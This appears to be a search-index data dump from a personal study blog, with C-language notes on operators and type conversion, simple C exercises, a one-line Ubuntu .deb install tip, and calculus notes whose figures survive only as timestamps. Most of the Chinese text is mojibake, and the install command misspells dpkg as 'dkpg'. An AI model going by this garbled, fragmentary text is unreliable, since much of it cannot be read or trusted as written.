äºŒè¿›åˆ¶å³ç§»è¿ç®—ç¬¦ã€‚å°†ä¸€ä¸ªæ•°çš„å„äºŒè¿›åˆ¶ä½å…¨éƒ¨å³ç§»è‹¥å¹²ä½ï¼Œæ­£æ•°å·¦è¡¥0ï¼Œè´Ÿæ•°å·¦è¡¥1ï¼Œå³è¾¹ä¸¢å¼ƒã€‚ A &gt;&gt; 2 å°†å¾—åˆ° 15ï¼Œå³ä¸º 0000 1111 èµ‹å€¼è¿ç®—ç¬¦ æè¿° å®ä¾‹ = ç®€å•çš„èµ‹å€¼è¿ç®—ç¬¦ï¼ŒæŠŠå³è¾¹æ“ä½œæ•°çš„å€¼èµ‹ç»™å·¦è¾¹æ“ä½œæ•° C = A + B å°†æŠŠ A + B çš„å€¼èµ‹ç»™ C += åŠ ä¸”èµ‹å€¼è¿ç®—ç¬¦ï¼ŒæŠŠå³è¾¹æ“ä½œæ•°åŠ ä¸Šå·¦è¾¹æ“ä½œæ•°çš„ç»“æœèµ‹å€¼ç»™å·¦è¾¹æ“ä½œæ•° C += A ç›¸å½“äº C = C + A -= å‡ä¸”èµ‹å€¼è¿ç®—ç¬¦ï¼ŒæŠŠå·¦è¾¹æ“ä½œæ•°å‡å»å³è¾¹æ“ä½œæ•°çš„ç»“æœèµ‹å€¼ç»™å·¦è¾¹æ“ä½œæ•° C -= A ç›¸å½“äº C = C - A *= ä¹˜ä¸”èµ‹å€¼è¿ç®—ç¬¦ï¼ŒæŠŠå³è¾¹æ“ä½œæ•°ä¹˜ä»¥å·¦è¾¹æ“ä½œæ•°çš„ç»“æœèµ‹å€¼ç»™å·¦è¾¹æ“ä½œæ•° C = A ç›¸å½“äº C = C A /= é™¤ä¸”èµ‹å€¼è¿ç®—ç¬¦ï¼ŒæŠŠå·¦è¾¹æ“ä½œæ•°é™¤ä»¥å³è¾¹æ“ä½œæ•°çš„ç»“æœèµ‹å€¼ç»™å·¦è¾¹æ“ä½œæ•° C /= A ç›¸å½“äº C = C / A %= æ±‚æ¨¡ä¸”èµ‹å€¼è¿ç®—ç¬¦ï¼Œæ±‚ä¸¤ä¸ªæ“ä½œæ•°çš„æ¨¡èµ‹å€¼ç»™å·¦è¾¹æ“ä½œæ•° C %= A ç›¸å½“äº C = C % A &lt;&lt;= å·¦ç§»ä¸”èµ‹å€¼è¿ç®—ç¬¦ C &lt;&lt;= 2 ç­‰åŒäº C = C &lt;&lt; 2 &gt;&gt;= å³ç§»ä¸”èµ‹å€¼è¿ç®—ç¬¦ C &gt;&gt;= 2 ç­‰åŒäº C = C &gt;&gt; 2 &amp;= æŒ‰ä½ä¸ä¸”èµ‹å€¼è¿ç®—ç¬¦ C &amp;= 2 ç­‰åŒäº C = C &amp; 2 ^= æŒ‰ä½å¼‚æˆ–ä¸”èµ‹å€¼è¿ç®—ç¬¦ C ^= 2 ç­‰åŒäº C = C ^ 2 \\ = æŒ‰ä½æˆ–ä¸”èµ‹å€¼è¿ç®—ç¬¦ C \\ = 2 ç­‰åŒäº C = C \\ 2 æ‚é¡¹è¿ç®—ç¬¦ æè¿° å®ä¾‹ sizeof() è¿”å›å˜é‡çš„å¤§å°ã€‚ sizeof(a) å°†è¿”å› 4ï¼Œå…¶ä¸­ a æ˜¯æ•´æ•°ã€‚ &amp; è¿”å›å˜é‡çš„åœ°å€ã€‚ &a; å°†ç»™å‡ºå˜é‡çš„å®é™…åœ°å€ã€‚ * æŒ‡å‘ä¸€ä¸ªå˜é‡ã€‚ *a; å°†æŒ‡å‘ä¸€ä¸ªå˜é‡ã€‚ ? : æ¡ä»¶è¡¨è¾¾å¼ å¦‚æœæ¡ä»¶ä¸ºçœŸ ? åˆ™å€¼ä¸º X : å¦åˆ™å€¼ä¸º Y è¯­å¥èµ‹å€¼è¯­å¥èµ‹å€¼è¿ç®—ç¬¦ = å¤åˆçš„èµ‹å€¼è¿ç®—ç¬¦ a+=3 ç­‰ä»·äºa=a+3; x*=y+8 ç­‰ä»·äºx=x*(y+8); x%=3 ç­‰ä»·äºx=x%3; èµ‹å€¼è¡¨è¾¾å¼ å˜é‡ èµ‹å€¼è¿ç®—ç¬¦ è¡¨è¾¾å¼ èµ‹å€¼è¿‡ç¨‹ä¸­çš„ç±»å‹è½¬æ¢ 1å°†æµ®ç‚¹å‹æ•°æ®(åŒ…æ‹¬å•,åŒç²¾åº¦)èµ‹ç»™æ•´å‹å˜é‡æ—¶,å…ˆå¯¹æµ®ç‚¹æ•°å–æ•´,å³èˆå¼ƒå°æ•°éƒ¨åˆ†,ç„¶åèµ‹äºˆæ•´å‹å˜é‡; 2å°†æ•´å‹æ•°æ®èµ‹å€¼ç»™å•,åŒç²¾åº¦å˜é‡æ—¶,æ•°å€¼ä¸å˜,ä½†ä»¥æµ®ç‚¹æ•°å½¢å¼å­˜å‚¨åˆ°å˜é‡ä¸­. 3å°†ä¸€ä¸ªdoubleå‹èµ‹ç»™ä¸€floatå˜é‡æ—¶,å…ˆå°†åŒç²¾åº¦æ•°è½¬æ¢ä¸ºå•ç²¾åº¦,å³åªå–6~7ä½æœ‰æ•ˆæ•°å­—,å­˜å‚¨åˆ°floatå‹å˜é‡çš„4ä¸ªå­—èŠ‚ä¸­. 4å­—ç¬¦å‹æ•°æ®èµ‹ç»™æ•´å‹å˜é‡æ—¶,å°†å­—ç¬¦çš„ASCIIä»£ç èµ‹ç»™æ•´å‹å˜é‡ 5å°†ä¸€ä¸ªå å­—èŠ‚å¤šçš„æ•´å‹æ•°æ®èµ‹ç»™ä¸€ä¸ªå å­—èŠ‚å°‘çš„æ•´å‹å˜é‡æˆ–å­—ç¬¦å˜é‡(ä¾‹å¦‚æŠŠå 4ä¸ªå­—èŠ‚çš„intå‹æ•°æ®èµ‹ç»™å 2ä¸ªå­—èŠ‚çš„shortå˜é‡æˆ–å 1ä¸ªå­—èŠ‚çš„charå˜é‡)æ—¶,åªå°†å…¶ä½å­—èŠ‚åŸå°ä¸åŠ¨åœ°é€åˆ°è¢«èµ‹å€¼çš„å˜é‡(å³å‘ç”Ÿ&quot;æˆªæ–­&quot;),å¦‚: int i=289; char c =&#39;a&#39;; c=i; æ•°æ®çš„è¾“å…¥è¾“å‡ºprintf(); scanf(); putchar(); getchar();","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"C algorithm","slug":"C-algorithm","date":"2020-10-25T09:15:22.000Z","updated":"2021-04-11T17:11:28.108Z","comments":true,"path":"C-algorithm/","link":"","permalink":"https://blog.kayleh.top/C-algorithm/","excerpt":"","text":"ç®—æ³•1.ä»€ä¹ˆæ˜¯ç®—æ³•?ç®—æ³•ï¼ˆAlgorithmï¼‰æ˜¯æŒ‡è§£é¢˜æ–¹æ¡ˆçš„å‡†ç¡®è€Œå®Œæ•´çš„æè¿°ï¼Œæ˜¯ä¸€ç³»åˆ—è§£å†³é—®é¢˜çš„æ¸…æ™°æŒ‡ä»¤ï¼Œç®—æ³•ä»£è¡¨ç€ç”¨ç³»ç»Ÿçš„æ–¹æ³•æè¿°è§£å†³é—®é¢˜çš„ç­–ç•¥æœºåˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½å¤Ÿå¯¹ä¸€å®šè§„èŒƒçš„è¾“å…¥ï¼Œåœ¨æœ‰é™æ—¶é—´å†…è·å¾—æ‰€è¦æ±‚çš„è¾“å‡ºã€‚ 2.ä»€ä¹ˆå«ç»“æ„åŒ–ç®—æ³•?ä¸ºä»€ä¹ˆè¦æå€¡ç»“æ„åŒ–ç®—æ³•?ç»“æ„åŒ–ç®—æ³•æ˜¯ç”±ä¸€äº›åŸºæœ¬ç»“æ„é¡ºåºç»„æˆçš„ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå¤§çš„åŠŸèƒ½çš„å®ç°åˆ†éš”ä¸ºè®¸å¤šä¸ªå°åŠŸèƒ½çš„å®ç°ã€‚ è‡ªé¡¶å‘ä¸‹,é€æ­¥ç»†åŒ–,æ¨¡å—åŒ–è®¾è®¡,ç»“æ„åŒ–ç¼–ç ","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"C programming","slug":"C-programming","date":"2020-10-25T09:14:40.000Z","updated":"2021-04-11T17:11:28.118Z","comments":true,"path":"C-programming/","link":"","permalink":"https://blog.kayleh.top/C-programming/","excerpt":"","text":"ç¨‹åº1.ä»€ä¹ˆæ˜¯ç¨‹åº?ä»€ä¹ˆæ˜¯ç¨‹åºè®¾è®¡?ç¨‹åºæ˜¯ä¸€ç»„è®¡ç®—æœºèƒ½è¯†åˆ«å’Œæ‰§è¡Œçš„æŒ‡ä»¤ï¼Œè¿è¡Œäºç”µå­è®¡ç®—æœºä¸Šï¼Œæ»¡è¶³äººä»¬æŸç§éœ€æ±‚çš„ä¿¡æ¯åŒ–å·¥å…·ã€‚ç¨‹åºè®¾è®¡ï¼ˆprogrammingï¼‰ï¼Œæ˜¯ç»™å‡ºè§£å†³ç‰¹å®šé—®é¢˜ç¨‹åºçš„è¿‡ç¨‹ï¼Œè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­çš„é‡è¦æ­¥éª¤ã€‚ç¨‹åºè®¾è®¡å¾€å¾€ä»¥æŸç§ç¨‹åºè®¾è®¡è¯­è¨€ä¸ºå·¥å…·ï¼Œç»™å‡ºè¿™ç§è¯­è¨€ä¸‹çš„ç¨‹åºã€‚ç¨‹åºè®¾è®¡è¿‡ç¨‹ä¸€èˆ¬åŒ…æ‹¬åˆ†æã€è®¾è®¡ã€ç¼–ç ã€æµ‹è¯•ã€è°ƒè¯•ç­‰ä¸åŒé˜¶æ®µã€‚ 2.ä¸ºä»€ä¹ˆéœ€è¦è®¡ç®—æœºè¯­è¨€?é«˜çº§è¯­è¨€æœ‰å“ªäº›ç‰¹ç‚¹?äººå’Œè®¡ç®—æœºäº¤æµä¿¡æ¯éœ€è¦è§£å†³è¯­è¨€é—®é¢˜,éœ€è¦åˆ›é€ ä¸€ç§è®¡ç®—æœºå’Œäººéƒ½èƒ½è¯†åˆ«çš„è¯­è¨€. é«˜çº§è¯­è¨€æ˜¯ä»äººç±»çš„é€»è¾‘æ€ç»´è§’åº¦å‡ºå‘çš„è®¡ç®—æœºè¯­è¨€ï¼ŒæŠ½è±¡ç¨‹åº¦å¤§å¤§æé«˜ï¼Œéœ€è¦ç»è¿‡ç¼–è¯‘æˆç‰¹å®šæœºå™¨ä¸Šçš„ç›®æ ‡ä»£ç æ‰èƒ½æ‰§è¡Œï¼Œä¸€æ¡é«˜çº§è¯­è¨€çš„è¯­å¥å¾€å¾€éœ€è¦è‹¥å¹²æ¡æœºå™¨æŒ‡ä»¤æ¥å®Œæˆã€‚é«˜çº§è¯­è¨€ç‹¬ç«‹äºæœºå™¨çš„ç‰¹æ€§æ˜¯é ç¼–è¯‘å™¨ä¸ºä¸åŒæœºå™¨ç”Ÿæˆä¸åŒçš„ç›®æ ‡ä»£ç (æˆ–æœºå™¨æŒ‡ä»¤)æ¥å®ç°çš„ã€‚ 3.æ­£ç¡®è§£é‡Šä¸€ä¸‹åè¯ä»¥åŠå«ä¹‰:(1)æºç¨‹åº,ç›®æ ‡ç¨‹åº,å¯æ‰§è¡Œç¨‹åºã€‚ æºç¨‹åºï¼šæŒ‡æœªç¼–è¯‘çš„æŒ‰ç…§ä¸€å®šçš„ç¨‹åºè®¾è®¡è¯­è¨€è§„èŒƒä¹¦å†™çš„æ–‡æœ¬æ–‡ä»¶ï¼Œæ˜¯ä¸€ç³»åˆ—äººç±»å¯è¯»çš„è®¡ç®—æœºè¯­è¨€æŒ‡ä»¤ ç›®æ ‡ç¨‹åºï¼šä¸ºæºç¨‹åºç»ç¼–è¯‘å¯ç›´æ¥è¢«è®¡ç®—æœºè¿è¡Œçš„æœºå™¨ç é›†åˆï¼Œåœ¨è®¡ç®—æœºæ–‡ä»¶ä¸Šä»¥.objä½œæ‰©å±•å å¯æ‰§è¡Œç¨‹åºï¼šå°†æ‰€æœ‰ç¼–è¯‘åå¾—åˆ°çš„ç›®æ ‡æ¨¡å—è¿æ¥è£…é…èµ·æ¥ï¼Œåœ¨ä¸å‡½æ•°åº“ç›¸è¿æ¥æˆä¸ºä¸€ä¸ªæ•´ä½“ï¼Œç”Ÿæˆä¸€ä¸ªå¯ä¾›è®¡ç®—æœºæ‰§è¡Œçš„ç›®æ ‡ç¨‹åºï¼Œæˆä¸ºå¯æ‰§è¡Œç¨‹åº (2)ç¨‹åºç¼–è¾‘,ç¨‹åºç¼–è¯‘,ç¨‹åºè¿æ¥ã€‚ç¨‹åºç¼–è¾‘ï¼šä¸Šæœºè¾“å…¥æˆ–è€…ç¼–è¾‘æºç¨‹åºã€‚ ç¨‹åºç¼–è¯‘ï¼š å…ˆç”¨Cæä¾›çš„â€œé¢„å¤„ç†å™¨â€ï¼Œå¯¹ç¨‹åºä¸­çš„é¢„å¤„ç†æŒ‡ä»¤è¿›è¡Œç¼–è¯‘é¢„å¤„ç† å¯¹æºç¨‹åºè¿›è¡Œè¯­æ³•æ£€æŸ¥ï¼Œ åˆ¤æ–­æ˜¯å¦æœ‰è¯­æ³•é”™è¯¯ï¼Œç›´åˆ°æ²¡æœ‰è¯­æ³•é”™è¯¯æœªçŸ¥ ç¼–è¯‘ç¨‹åºè‡ªåŠ¨æŠŠæºç¨‹åºè½¬æ¢ä¸ºäºŒè¿›åˆ¶å½¢å¼çš„ç›®æ ‡ç¨‹åº ç¨‹åºè¿æ¥ï¼šå°†æ‰€æœ‰ç¼–è¯‘åå¾—åˆ°çš„ç›®æ ‡æ¨¡å—è¿æ¥è£…é…èµ·æ¥ï¼Œåœ¨ä¸å‡½æ•°åº“ç›¸è¿æ¥æˆä¸ºä¸€ä¸ªæ•´ä½“çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºç¨‹åºè¿æ¥ (3)ç¨‹åº,ç¨‹åºæ¨¡å—,ç¨‹åºæ–‡ä»¶ã€‚ç¨‹åºï¼šä¸€ç»„è®¡ç®—æœºèƒ½è¯†åˆ«å’Œæ‰§è¡Œçš„æŒ‡ä»¤ï¼Œè¿è¡Œäºç”µå­è®¡ç®—æœºä¸Šï¼Œæ»¡è¶³äººä»¬æŸç§éœ€æ±‚çš„ä¿¡æ¯åŒ–å·¥å…· ç¨‹åºæ¨¡å—ï¼šå¯ç”±æ±‡ç¼–ç¨‹åºã€ç¼–è¯‘ç¨‹åºã€è£…å…¥ç¨‹åºæˆ–ç¿»è¯‘ç¨‹åºä½œä¸ºä¸€ä¸ªæ•´ä½“æ¥å¤„ç†çš„ä¸€çº§ç‹¬ç«‹çš„ã€å¯è¯†åˆ«çš„ç¨‹åºæŒ‡ä»¤ ç¨‹åºæ–‡ä»¶ï¼šç¨‹åºçš„æ–‡ä»¶ç§°ä¸ºç¨‹åºæ–‡ä»¶ï¼Œç¨‹åºæ–‡ä»¶å­˜å‚¨çš„æ˜¯ç¨‹åºï¼ŒåŒ…æ‹¬æºç¨‹åºå’Œå¯æ‰§è¡Œç¨‹åº (4)å‡½æ•°,ä¸»å‡½æ•°ï¼Œè¢«è°ƒç”¨å‡½æ•°,åº“å‡½æ•°ã€‚å‡½æ•°ï¼šå°†ä¸€æ®µç»å¸¸éœ€è¦ä½¿ç”¨çš„ä»£ç å°è£…èµ·æ¥ï¼Œåœ¨éœ€è¦ä½¿ç”¨æ—¶å¯ä»¥ç›´æ¥è°ƒç”¨ï¼Œæ¥å®Œæˆä¸€å®šåŠŸèƒ½ ä¸»å‡½æ•°ï¼šåˆç§°mainå‡½æ•°ï¼Œæ˜¯ç¨‹åºæ‰§è¡Œçš„èµ·ç‚¹ è¢«è°ƒç”¨å‡½æ•°ï¼šç”±ä¸€ä¸ªå‡½æ•°è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°ï¼Œåˆ™ç§°ç¬¬äºŒä¸ªå‡½æ•°ä¸ºè¢«è°ƒç”¨å‡½æ•° åº“å‡½æ•°ï¼šä¸€èˆ¬æ˜¯æŒ‡ç¼–è¯‘å™¨æä¾›çš„å¯åœ¨cæºç¨‹åºä¸­è°ƒç”¨çš„å‡½æ•°ã€‚å¯åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯cè¯­è¨€æ ‡å‡†è§„å®šçš„åº“å‡½æ•°ï¼Œä¸€ç±»æ˜¯ ç¼–è¯‘å™¨ç‰¹å®šçš„åº“å‡½æ•° (5)ç¨‹åºè°ƒè¯•,ç¨‹åºæµ‹è¯•ã€‚ç¨‹åºè°ƒè¯•ï¼šæ˜¯å°†ç¼–åˆ¶çš„ç¨‹åºæŠ•å…¥å®é™…è¿è¡Œå‰ï¼Œç”¨æ‰‹å·¥æˆ–ç¼–è¯‘ç¨‹åºç­‰æ–¹æ³•è¿›è¡Œæµ‹è¯•ï¼Œä¿®æ­£è¯­æ³•é”™è¯¯å’Œé€»è¾‘é”™è¯¯çš„è¿‡ç¨‹ ç¨‹åºæµ‹è¯•ï¼šæ˜¯æŒ‡å¯¹ä¸€ä¸ªå®Œæˆäº†å…¨éƒ¨æˆ–éƒ¨åˆ†åŠŸèƒ½ã€æ¨¡å—çš„è®¡ç®—æœºç¨‹åºåœ¨æ­£å¼ä½¿ç”¨å‰çš„æ£€æµ‹ï¼Œä»¥ç¡®ä¿è¯¥ç¨‹åºèƒ½æŒ‰é¢„å®šçš„ æ–¹å¼æ­£ç¡®åœ°è¿è¡Œ 4.ç¼–å†™ä¸€ä¸ªcç¨‹åº,è¿è¡Œæ—¶è¾“å‡ºHello World! #include&lt;stdio.h&gt; int main() { printf(&quot;Hello World!&quot;); return 0; } 5.ç¼–å†™ä¸€ä¸ªcç¨‹åº,è¿è¡Œæ—¶è¾“å‡ºä¸€ä¸‹å›¾å½¢*** â€‹ *** â€‹ *** â€‹ *** #include&lt;stdio.h&gt; int main() { printf(&quot;*****\\n&quot;); printf(&quot; *****\\n&quot;); printf(&quot; *****\\n&quot;); printf(&quot; *****\\n&quot;); return 0; } 6.ç¼–å†™ä¸€ä¸ªcç¨‹åº,è¿è¡Œæ—¶è¾“å…¥a,b,cä¸‰ä¸ªå€¼,è¾“å‡ºå…¶ä¸­å€¼æœ€å¤§å€¼#include&lt;stdio.h&gt; int main() { int a, b, c, max; printf(&quot;input 3 number:&quot;); scanf(&quot;%d%d%d&quot;, &amp;a, &amp;b, &amp;c); max = a; if (max &lt; b) { max = b; } if (max &lt; c) { max = c; } printf(&quot;max:%d&quot;, max); return 0; }","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"ubuntu.debå®‰è£…åŒ…","slug":"ubuntu-debå®‰è£…åŒ…","date":"2020-10-06T05:16:50.000Z","updated":"2021-04-11T17:11:28.527Z","comments":true,"path":"ubuntu-debå®‰è£…åŒ…/","link":"","permalink":"https://blog.kayleh.top/ubuntu-deb%E5%AE%89%E8%A3%85%E5%8C%85/","excerpt":"","text":"dkpg -i xxxx.deb éœ€è¦è¶…çº§ç”¨æˆ·æƒé™ sudo dkpg -i xxxx.deb","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://blog.kayleh.top/tags/linux/"}]},{"title":"å¾®åˆ†æ–¹ç¨‹","slug":"å¾®åˆ†æ–¹ç¨‹","date":"2020-10-05T06:55:36.000Z","updated":"2021-04-11T17:11:28.876Z","comments":true,"path":"å¾®åˆ†æ–¹ç¨‹/","link":"","permalink":"https://blog.kayleh.top/%E5%BE%AE%E5%88%86%E6%96%B9%E7%A8%8B/","excerpt":"","text":"å¾®åˆ†æ–¹ç¨‹1601913199716 å®šä¹‰ï¼š1601913450223 å¾®åˆ†æ–¹ç¨‹çš„é˜¶ï¼šå¯¼æ•°çš„æœ€é«˜é˜¶æ•° äºŒé˜¶ï¼š 1601913485819\" style=\"zoom:50%; é€šè§£ç‹¬ç«‹å¸¸æ•°çš„ä¸ªæ•°=é˜¶æ•°ï¼Œæ¯”å¦‚äºŒé˜¶çš„æœ€ç»ˆçš„è§£é‡Œæœ‰c1ï¼Œc2ä¸¤ä¸ªç‹¬ç«‹çš„å¸¸æ•° ç‰¹è§£å¦‚æœå¸¸æ•°éƒ½ç¡®å®šçš„è§£å«ç‰¹è§£ åˆå§‹æ¡ä»¶è§£é¢˜è¿‡ç¨‹ä¸€èˆ¬æŠŠåˆå§‹æ¡ä»¶ä»£å…¥åˆ°é€šè§£é‡Œï¼Œç¡®å®šå¸¸æ•°çš„å€¼ï¼Œå¾—åˆ°çš„å°±æ˜¯ç‰¹è§£ ä¸€é˜¶å¾®åˆ†æ–¹ç¨‹å¯åˆ†ç¦»å˜é‡ åˆ†ç¦»å˜é‡ï¼ŒåŒæ—¶ç§¯åˆ† ä¾‹é¢˜ï¼š1601960660685\" style=\"zoom:50%; 1601974381957 é½æ¬¡æ–¹ç¨‹dy/dx=f(y/x) 1601974805152 ä¾‹é¢˜1601975659287 â€‹ â†“ 1601975852227 1601976016219\" style=\"zoom:50%; 1601976189378 ä¸€é˜¶çº¿æ€§æ–¹ç¨‹1601976400936 ä¸€é˜¶çº¿æ€§é½æ¬¡å¾®åˆ†æ–¹ç¨‹ï¼š 1601976462021 é½æ¬¡æ–¹ç¨‹çš„è§£ éé½æ¬¡æ–¹ç¨‹çš„è§£ï¼š 1601977077686 ä¾‹é¢˜1601977447388 1601978340530 #ä¼¯åŠªåˆ©æ–¹ç¨‹1601978484353","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"çº§æ•°","slug":"çº§æ•°","date":"2020-10-03T21:24:36.000Z","updated":"2021-04-11T17:11:28.982Z","comments":true,"path":"çº§æ•°/","link":"","permalink":"https://blog.kayleh.top/%E7%BA%A7%E6%95%B0/","excerpt":"","text":"æ— ç©·çº§æ•°ç­‰æ¯”æ•°åˆ— 1601790764370 1601790914893 ä¾‹é¢˜ 1601791340789 1601791680034 1601792414977 1601793241870 è°ƒå’Œçº§æ•° è°ƒå’Œçº§æ•°æ˜¯å‘æ•£çš„ 1601793542661 æ€§è´¨1601793732086 1601793936645 ç›¸ååˆ™æœªå¿… 1601794096106 æ•›æ•£æ€§ä¸å˜ å¦‚æœçº§æ•°æ”¶æ•›ï¼Œé€šé¡¹æ˜¯è¶‹äº0çš„ã€‚ 1601794310032 é€šé¡¹è¶‹äº0ï¼Œæœªå¿…æ˜¯æ”¶æ•›çš„ï¼Œ é€šé¡¹ä¸è¶‹äº0ï¼Œä¸€å®šæ˜¯ä¸æ”¶æ•›çš„ã€‚ 1601794730888 ä¾‹é¢˜ï¼š 1601795245209 é€šé¡¹ä¸è¶‹äº0å¿…å‘æ•£ 1601795312952 å»æ‰äº†ç¬¬ä¸€é¡¹ï¼Œæ•›æ•£æ€§ä¸å˜ æ­£é¡¹çº§æ•°å¤§æ”¶å¿…å°æ”¶ å°æ•£å¿…å¤§æ•£ 1601804217057 ä¾‹é¢˜ 1601804688577 1601805099865 1601805233170 å…¬å¼ 1601825215690 ä¾‹é¢˜1601825904805 ç­‰äº1è¯´æ˜åˆ†å­åˆ†æ¯æœ‰ç›¸åŒçš„æ•›æ•£æ€§,1/næ˜¯å‘æ•£çš„ 1601826789198 è¾¾æœ—è´å°”åˆ¤åˆ«æ³•1 1601827007419 1601827327209 1601827440373 2 1601828466075 è§£é¢˜è¿‡ç¨‹ï¼š 1601828887182 ä»»æ„é¡¹çº§æ•°å’Œè°ƒå’Œçº§æ•°ç›¸æ¯”ï¼Œè¿™ä¸ªæ˜¯æ”¶æ•›çš„(â€œäº¤é”™è°ƒå’Œçº§æ•°â€) 1601829465113 1601829594795 ä¾‹é¢˜ï¼š è¯æ˜$U^n$æ˜¯é€’å‡çš„ 1601871650150 ç»å¯¹å€¼çº§æ•°å®šç†ï¼š1601872096360 ç»å¯¹æ”¶æ•›1601872183627 ä¾‹é¢˜ï¼š 1601872339329\" style=\"zoom:50%; å…ˆå–ç»å¯¹å€¼ï¼Œpçº§æ•°æ˜¯æ”¶æ•›çš„ï¼Œè¿™ä¸ªå°±æ˜¯ç»å¯¹æ”¶æ•›çš„ã€‚ 1601872386548\" style=\"zoom:50%; å–ç»å¯¹å€¼ï¼Œæ˜¯è°ƒå’Œçº§æ•°å‘æ•£çš„ï¼Œä½†æ˜¯åŸæ¥çš„æ˜¯äº¤é”™è°ƒå’Œçº§æ•°æ˜¯æ”¶æ•›çš„ï¼Œæ‰€ä»¥æ˜¯æ¡ä»¶æ”¶æ•› å®šç†1601872739222 ä¾‹é¢˜ï¼š 1601872820329 1601872908387 1601873036417 æ€»ç»“1601873460780 ä¾‹é¢˜ï¼š1601908365663 æ€§è´¨ï¼š1601909335329","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"äºŒé‡ç§¯åˆ†","slug":"äºŒé‡ç§¯åˆ†","date":"2020-10-01T22:43:15.000Z","updated":"2021-04-11T17:11:28.576Z","comments":true,"path":"äºŒé‡ç§¯åˆ†/","link":"","permalink":"https://blog.kayleh.top/%E4%BA%8C%E9%87%8D%E7%A7%AF%E5%88%86/","excerpt":"","text":"æ¦‚å¿µä½“ç§¯ å‡ ä½•å«ä¹‰1601621561773 æ€§è´¨1601621872570 1601622019111 1601622207780 1601622538512 1601622624030 ç›´è§’åæ ‡ç³»çš„è®¡ç®—1601628194665 1601628177270 1601628338192 1601628391367 ä¾‹é¢˜ï¼š xå‹æ˜¯ä»å·¦åˆ°å³èµ° ä¸Šè¾¹çš„å‡½æ•°å†™æˆä¸Šé™ï¼Œä¸‹è¾¹çš„å‡½æ•°å†™æˆä¸‹é™ 1601628609123 yå‹æ˜¯ä»ä¸‹åˆ°ä¸Šèµ° å·¦è¾¹çš„å‡½æ•°å†™æˆä¸‹é™ï¼Œå³è¾¹çš„å‡½æ•°å†™æˆä¸Šé™ 1601629244702 1601629522050 ç‰¹æ®ŠçŸ©å½¢ 1601629887174 åˆ†æˆä¸¤éƒ¨åˆ†çš„ï¼š 1601630012904 1601630687632 æåæ ‡çš„è®¡ç®—æåæ ‡ 1601661252410 1601661564115 1601662210072 1601778511764 äºŒé‡ç§¯åˆ†å†™æˆæåæ ‡çš„è¡¨è¾¾æ–¹å¼1601779046075 1601780186870 ä¾‹é¢˜ï¼š 1601780625791 $-e^{-x}$æ±‚å¯¼æ˜¯$e^{-x}$ 1601782073282","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"åå¯¼æ•°","slug":"åå¯¼æ•°","date":"2020-09-29T21:38:35.000Z","updated":"2021-04-11T17:11:28.617Z","comments":true,"path":"åå¯¼æ•°/","link":"","permalink":"https://blog.kayleh.top/%E5%81%8F%E5%AF%BC%E6%95%B0/","excerpt":"","text":"åœ¨æŸç‚¹åå¯¼çš„å®šä¹‰1601445508700 1601445566320 å¯¹yæ±‚å¯¼æ—¶ï¼Œæ˜¯æŠŠxçœ‹ä½œå¸¸æ•°ï¼Œå¯¹yæ±‚å¯¼ å¯¹xæ±‚å¯¼æ—¶ï¼Œæ˜¯æŠŠyçœ‹ä½œå¸¸æ•°ï¼Œå¯¹xæ±‚å¯¼ 1601445908951 1601483632915 1601484198275 å¤šå…ƒå‡½æ•°å¯å¯¼ä¸è¿ç»­1601484542681 ä¾‹é¢˜ï¼š 1601485323277 å‡ ä½•æ„ä¹‰1601486051149 äºŒé˜¶åå¯¼æ•°å’Œæ··åˆåå¯¼1601486294681 å…ˆæ±‚xå†æ±‚yè·Ÿå…ˆæ±‚yå†æ±‚xæ—¶ä¸€æ ·çš„ å¦‚æœä¸¤ä¸ªæ··åˆäºŒé˜¶åå¯¼æ•°åœ¨åŒºåŸŸdä¸Šæ˜¯è¿ç»­çš„ã€‚ å…¨å¾®åˆ†1601519540974 xï¼Œyéƒ½å‘ç”Ÿçš„å˜åŒ–å¼•èµ·äº†zçš„å˜åŒ– 1601521286233 1601521299461 å®šä¹‰ï¼š1601522781003 å¯å¾®å¿…è¦æ¡ä»¶1601522951253 1601524573062 åå¯¼å­˜åœ¨åªæ˜¯å¯å¾®çš„å¿…è¦æ¡ä»¶ã€‚ å¯å¾®çš„å……åˆ†æ¡ä»¶1601537220332 1601537658697\" style=\"zoom:50%; ä¸€ä¸ªå…¨å¾®åˆ†ç­‰äºä¸¤ä¸ªåå¾®åˆ†ä¹‹å’Œã€‚ 1601538273461 1601538416772 ä¾‹é¢˜ï¼š 1601539670990 å¤šå…ƒå¤åˆå‡½æ•°æ±‚å¯¼1601543140863 1601544657228 xå¯¹xæ±‚å¯¼=1 ä¾‹é¢˜ï¼š1601546031624 éšå‡½æ•°æ±‚å¯¼å®šç†11601555127077\" style=\"zoom:50%; ä¾‹é¢˜ï¼š1601556049588 å®šç†2ï¼š1601556490422 ä¾‹é¢˜1601556789370 å®šç†3ä¾‹é¢˜ï¼š 1601570240705 #å…‹è±å§†æ³•åˆ™1601571263222 äºŒå…ƒå‡½æ•°çš„æå€¼","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://blog.kayleh.top/tags/math/"}]},{"title":"å¤šå…ƒå‡½æ•°","slug":"å¤šå…ƒå‡½æ•°","date":"2020-09-28T09:10:02.000Z","updated":"2021-04-11T17:11:28.841Z","comments":true,"path":"å¤šå…ƒå‡½æ•°/","link":"","permalink":"https://blog.kayleh.top/%E5%A4%9A%E5%85%83%E5%87%BD%E6%95%B0/","excerpt":"","text":"ç©ºé—´è§£æå‡ ä½•1601354294435 ä¸¤ç‚¹ä¹‹é—´è·ç¦» 1601354442692 1601354799490 å¹³é¢æ–¹ç¨‹1601354842773 çƒé¢æ–¹ç¨‹1601354949365 1601355067816 